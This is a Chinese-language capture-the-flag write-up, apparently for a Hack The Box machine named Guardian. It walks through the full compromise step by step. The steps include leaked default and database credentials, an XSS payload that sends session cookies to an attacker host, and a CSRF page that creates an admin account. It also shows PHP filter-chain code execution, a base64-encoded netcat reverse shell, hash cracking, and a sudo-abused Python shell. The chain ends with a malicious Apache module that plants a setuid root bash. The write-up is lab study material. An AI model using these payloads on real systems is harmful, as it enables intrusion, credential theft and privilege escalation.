
<img width="857" height="506" alt="Image" src="https://github.com/user-attachments/assets/f0f0b930-c354-44e8-b88a-063b24dcd8a4" />

nmap -sC -sV 10.129.237.248

echo 10.129.237.248 guardian.htb >> /etc/hosts

开放 22和80端口

<img width="552" height="306" alt="Image" src="https://github.com/user-attachments/assets/67493442-ce49-45d6-a28e-d46cbe7dffd4" />

网页源代码中发现子域名

<img width="560" height="383" alt="Image" src="https://github.com/user-attachments/assets/f8c78c20-bc74-4ce1-a185-fa3d6c98ab51" />

在Help中暴露了一个默认密码

<img width="597" height="381" alt="Image" src="https://github.com/user-attachments/assets/c81660d4-4b5b-4ecd-a768-504394e11042" />

<img width="392" height="201" alt="Image" src="https://github.com/user-attachments/assets/0c556b93-baf1-4425-b7b1-86804f20ad1a" />

回到主域名，发现页面有几个账号

<img width="660" height="341" alt="Image" src="https://github.com/user-attachments/assets/755d4904-35ae-461f-ae43-f9c8eedf7325" />

登录
GU0142023
GU1234

<img width="594" height="347" alt="Image" src="https://github.com/user-attachments/assets/bb6c98c0-852c-4894-9885-c600417c9355" />

这是一个了聊天的功能，并且有传参

尝试遍历参数，查看其他用户的聊天内容

<img width="690" height="335" alt="Image" src="https://github.com/user-attachments/assets/d6804255-5d64-4138-a3df-20f0c49f6a2e" />

爆破一手
6100长度应该就是没有信息的

<img width="696" height="230" alt="Image" src="https://github.com/user-attachments/assets/7d75003b-af02-4c42-804d-924e4a49e961" />

得到一个账号密码
gitea代码平台

gitea: DHsNnk3V503

<img width="675" height="444" alt="Image" src="https://github.com/user-attachments/assets/6002c3cc-dc3e-4cb2-9ed6-8818aa0ddf05" />

用户名是jamil.enockson  
密码：DHsNnk3V503

<img width="719" height="327" alt="Image" src="https://github.com/user-attachments/assets/c4850171-12e9-49e0-8b09-582477db214a" />

将http://gitea.guardian.htb/添加到 /etc/hosts

登录成功

<img width="549" height="245" alt="Image" src="https://github.com/user-attachments/assets/c40ac906-9841-421e-9331-0df326d18a38" />

找到了一个数据库的账号密码

账号：root
密码：Gu4rd14n_un1_1s_th3_b3st
盐：8Sb)tM1vs1SS

<img width="897" height="500" alt="Image" src="https://github.com/user-attachments/assets/6d64b3e0-6e86-411a-9954-567cbc1c45f0" />

<img width="635" height="297" alt="Image" src="https://github.com/user-attachments/assets/4445319d-83b0-4c2b-8a20-f04d44455078" />

Google一下这个版本

<img width="585" height="543" alt="Image" src="https://github.com/user-attachments/assets/fbd27935-120f-484d-b0c9-bfb2bd31244b" />


全是XSS

https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-79xx-vf93-p7cx

制作XSS文件
https://www.treegrid.com/FSheet

<script>fetch('http://10.10.16.67/steal?cookie=' + btoa(document.cookie));</script>

<img width="932" height="543" alt="Image" src="https://github.com/user-attachments/assets/f8ac3088-d889-4ce0-8439-54114af23047" />

<img width="717" height="378" alt="Image" src="https://github.com/user-attachments/assets/e11254b2-0fd0-4935-a28e-80844ae03f22" />

本地开启80端口

然后上传这个文件

获取到一串cookie

/steal?cookie=UEhQU0VTU0lEPTV0cDlpbTZ2aGJ2Y2l2cWRsbThtYXBzMzVq

<img width="456" height="207" alt="Image" src="https://github.com/user-attachments/assets/a5f2ca88-ad9d-4179-a664-ef173c7f7b0a" />

<img width="456" height="207" alt="Image" src="https://github.com/user-attachments/assets/6994dbe7-776f-4b33-91c0-7596b5babb8b" />

base64解码q
PHPSESSID=5tp9im6vhbvcivqdlm8maps35j

利用浏览器插件修改cookie

获得一个老师的账号

<img width="869" height="357" alt="Image" src="https://github.com/user-attachments/assets/2bb61a22-f1ce-47bc-8ba3-ed1f99904385" />

在创建通知这里，创建的通知会被admin所查看

<img width="644" height="314" alt="Image" src="https://github.com/user-attachments/assets/4363989d-2563-4378-944d-43f5080b9141" />

CSRF漏洞，
我们现在就要利用这个功能，利用CSRF，让管理员创建账号
创建user，需要这几个参数

<img width="593" height="435" alt="Image" src="https://github.com/user-attachments/assets/2af6cede-b95d-4b4a-99a7-03c23d366c8b" />

<img width="593" height="435" alt="Image" src="https://github.com/user-attachments/assets/635fb81d-ccdc-437c-b1b1-2964cbcdd191" />

csrf_token在网页源码中可以看到
5a88e136a8c283d075e240a14a2d5c45

利用AI写一个CSRF的html Payload

<img width="497" height="234" alt="Image" src="https://github.com/user-attachments/assets/eabbefb5-3226-4dcf-aed3-16d41243c80e" />

<img width="486" height="350" alt="Image" src="https://github.com/user-attachments/assets/03a7b58a-6145-4614-a9af-23f101635959" />

<img width="432" height="125" alt="Image" src="https://github.com/user-attachments/assets/0dee1fd4-df09-4221-9eb1-9d8ed256c6b6" />

现在就创建用户成功了，并且是admin权限的

<img width="737" height="356" alt="Image" src="https://github.com/user-attachments/assets/419c8282-ee30-4812-b630-cd21b351703b" />

利用php_filter_chain_generator命令执行

https://github.com/synacktiv/php_filter_chain_generator/tree/main

<img width="455" height="293" alt="Image" src="https://github.com/user-attachments/assets/8d15c4c6-8ce8-4775-8ff5-73ee116acfb1" />

把上面生成的这一坨复制到report参数后，就相当于写入了一个php小马

<img width="705" height="360" alt="Image" src="https://github.com/user-attachments/assets/da4d7fb3-beaa-47c0-8561-50f690d230bb" />

输入经过base64编码的反弹shell命令

a=shell_exec("echo+cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC4xMC4xNi42NyA0NDQ0ID4vdG1wL2Y=+|+base64+-d+|+bash");

<img width="930" height="543" alt="Image" src="https://github.com/user-attachments/assets/feecad57-8eda-4ac9-924b-d50582105cc2" />


在之前的代码泄露中我们发现了mysql的账号密码

账号：root
密码：Gu4rd14n_un1_1s_th3_b3st
盐：8Sb)tM1vs1SS

拿到了一些账户还有hash

<img width="563" height="447" alt="Image" src="https://github.com/user-attachments/assets/f6dfd72b-af99-45b5-b170-211f8940f466" />

利用AI写个破解脚本

<img width="650" height="215" alt="Image" src="https://github.com/user-attachments/assets/eeaa99b8-e80c-4bfc-90d8-7f9880982114" />

拿到两个账号密码

 用户: jamil.enockson        密码: copperhouse56
  用户: admin                 密码: fakebake000

<img width="558" height="426" alt="Image" src="https://github.com/user-attachments/assets/fd10d9a9-2507-47da-94b1-242cf75c796a" />

拿到Userflag

sudo -l
查看当前用户拥有哪些 sudo 权限的命令
有一个/opt/scripts/utilities/utilities.py

<img width="689" height="69" alt="Image" src="https://github.com/user-attachments/assets/218ca6a6-5375-405b-a56c-d08934dcd167" />

<img width="689" height="69" alt="Image" src="https://github.com/user-attachments/assets/4a3386af-7d62-4350-b25d-985263797644" />

user = getpass.getuser()
if args.action == "backup-db":
    if user != "mark":
        print("Access denied.")
        sys.exit(1)
    db.backup_database()

意思就是检查是否是mark用户在操作

我们目前对这个status.py具有写入权限

<img width="393" height="219" alt="Image" src="https://github.com/user-attachments/assets/86605b48-ff15-4fb8-8497-f4b10d3c4ba8" />

<img width="447" height="122" alt="Image" src="https://github.com/user-attachments/assets/706624fb-d477-4d13-90ff-4fabfa7045b5" />

cat > /opt/scripts/utilities/utils/status.py << 'EOF'
import platform
import psutil
import os
import sys, socket, os, pty


def system_status():
    print("System:", platform.system(), platform.release())
    print("CPU usage:", psutil.cpu_percent(), "%")
    print("Memory usage:", psutil.virtual_memory().percent, "%")
    
    # 反弹交互式 bash shell（mark 用户权限）
    pty.spawn("/usr/bin/bash")
EOF

sudo -u mark /opt/scripts/utilities/utilities.py system-status

现在就切换到了mark用户

<img width="651" height="263" alt="Image" src="https://github.com/user-attachments/assets/35a08129-8447-48b1-acb6-3f0f4ed03b18" />

mark用户也有一个具有sudo权限的文件

<img width="537" height="111" alt="Image" src="https://github.com/user-attachments/assets/44dd57cf-941f-4a5b-a682-c2518a650a19" />

下载下来进行反编译

<img width="480" height="68" alt="Image" src="https://github.com/user-attachments/assets/fd30606a-c9b3-46bd-87b8-43029e59e4bc" />

<img width="480" height="68" alt="Image" src="https://github.com/user-attachments/assets/ec31b187-75e7-433a-8029-26353c95b58a" />

<img width="1216" height="670" alt="Image" src="https://github.com/user-attachments/assets/3f28bb77-e654-410d-bcdb-074cea2c5920" />

代码解释：
接收一个以 -f 开头的参数，后面跟一个配置文件路径
检查这个路径是否在 /home/mark/confs/ 目录下（通过 realpath 解析绝对路径 + starts_with 检查）
如果不在，就拒绝（Access denied）
如果在，就打开文件逐行读取
对每一行调用 is_unsafe_line 检查是否“危险”
如果任何一行被判定为 unsafe，就拒绝并报错
如果所有行都安全，就调用 execl("/usr/sbin/apache2ctl", "apache2ctl", "-f", 配置路径, 0) 来加载这个配置文件启动/重载 Apache

我们的操作需要在/home/mark/confs白名单目录下执行

妈了个逼的，confs文件夹下面一直会刷新，会清除你创建的文件，怪不得老子一直执行不了。

首先到/tmp目录
创建evil.c文件

cat > evil.c << 'EOF'
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>


__attribute__((constructor)) void init() {
    setuid(0);
    setgid(0);
    system("cp /bin/bash /tmp/johnny_bash; chmod 777 /tmp/johnny_bash; chmod u+s /tmp/johnny_bash;");
}
EOF

gcc将这个文件编译成evil.so
gcc evil.c -fPIC -shared -o evil.so

然后进入到confs目录
cd /home/mark/confs

创建 xxx.conf文件
cat > xxx.conf << 'EOF'
LoadModule evil_module /tmp/evil.so
EOF

利用mark用户对safeapache2ctl的sudu权限去执行xxx.conf
sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/xxx.conf

检查johnny_bash文件是否创建
ls -l /tmp/johnny_bash

最后到tmp目录去执行johnny_bash
./johnny_bash -p

<img width="761" height="434" alt="Image" src="https://github.com/user-attachments/assets/6efecd68-1bb7-47fe-a1db-9fa0c87a3350" />

